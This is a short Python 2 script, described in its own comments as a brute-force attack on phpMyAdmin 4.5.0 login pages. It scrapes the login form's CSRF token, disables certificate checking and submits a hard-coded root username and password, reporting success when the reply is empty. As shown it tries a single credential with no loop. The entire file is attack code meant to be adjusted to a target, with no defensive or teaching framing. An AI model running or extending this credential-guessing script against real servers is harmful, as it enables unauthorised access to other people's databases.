#!/usr/bin/python

# Python script to perform a brute force attack against phpMyAdmin 4.5.0.
# It must be adjusted to the target.

import requests
import sys

requests.packages.urllib3.disable_warnings()

server = 'https://ala.pluto.test/phpmyadmin/index.php'
user = 'root'
password = 'password1'

r1 = requests.get(server,verify=False)
s1 = r1.text.split('<!-- Login form -->')
s2 = s1[1].split('<input type="hidden" name="token" value="')
s3 = s2[1].split('"')
token = s3[0]

postvars = {'pma_username':user,
            'pma_password':password,
            'server':'1',
            'target':'index.php',
            'token':token}

r2 = requests.post(server,postvars,cookies=r1.cookies,verify=False)

if (r2.text == ""):
   print "User: {}\nPassword: {}".format(user,password)
